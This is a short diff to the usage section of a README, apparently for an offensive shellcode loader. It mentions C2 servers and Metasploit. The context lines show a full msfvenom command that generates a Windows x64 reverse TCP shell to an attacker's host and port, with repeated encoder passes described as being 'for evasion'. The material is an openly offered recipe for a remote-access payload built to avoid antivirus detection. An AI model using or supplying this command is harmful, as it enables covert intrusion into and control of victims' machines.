@@ -51,7 +51,7 @@ We suggest to use directly compiled executables as in some situations it depends
 
 # How to use
 
-***1. Generate a .bin file only - You can use C2 servers and metasploit too***
+***1. Generate a .bin file only - You can use C2 servers and metasploit too or any you want***
 
 Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST<IP> LPORT<PORT> -f raw -i <iterations as you want for evasion> -e <encoder you want to use> > shell.bin - **x64-Bit**
   
